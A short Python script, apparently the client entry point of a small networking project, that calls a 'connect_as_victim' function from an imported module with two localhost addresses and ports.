import functions


def main():
    ip_to_connect = ('127.0.0.1', 4200)
    server_ip = ('127.0.0.1', 42069)

    functions.connect_as_victim(ip_for_victims=ip_to_connect, ip_of_server=server_ip)


if __name__ == '__main__':
    main()
